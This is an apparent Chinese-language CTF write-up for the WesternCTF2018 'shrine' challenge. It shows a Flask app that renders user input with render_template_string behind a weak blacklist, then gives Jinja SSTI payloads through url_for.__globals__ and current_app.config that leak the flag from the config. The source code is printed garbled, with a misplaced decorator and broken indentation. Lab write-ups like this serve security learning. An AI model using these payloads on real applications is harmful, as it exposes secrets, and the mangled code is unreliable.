# [WesternCTF2018]shrine SSTI 绕过黑名单

```cobol
import flask
import os
app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')
@app.route('/')
def index():
    return open(__file__).read() @app.route('/shrine/')
    def shrine(shrine):
        def safe_jinja(s):
            s = s.replace('(', '').replace(')', '')
            blacklist = ['config', 'self']
            return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
            return flask.render_template_string(safe_jinja(shrine))
if __name__ == '__main__': app.run(debug=True)
```

这里用了flask我们就应该想到是SSTI模块注入

其中存在/shrine/ 目录

如何存在safe_jinjia 进行过滤 config 和self

所以平常的就无法实现

我们需要使用其他函数

例如 url_for() 或者 get_flashed_messages()

去读取全局变量 如何访问

我们要注意 这里过滤config和self是因为他们是变量 就会过滤

我们下面的payload中的是属性 所以不会过滤



<img src="https://i-blog.csdnimg.cn/blog_migrate/dfa731b01c18a20ddeea2596c7b3072f.png" alt="" style="max-height:177px; box-sizing:content-box;" />


我们先去看看全局变量

```handlebars
{{url_for.__globals__}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1b9187b396a0d944c7908142d804d894.png" alt="" style="max-height:817px; box-sizing:content-box;" />


存在 current_app 就是当前app 那么我们访问一下

```handlebars
/shrine/{{url_for.__globals__['current_app'].config}}
 
这里的config不会过滤 是因为是属性 所以不会过滤
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/95d76f1dd5d6f7ba057bce41ab689db7.png" alt="" style="max-height:173px; box-sizing:content-box;" />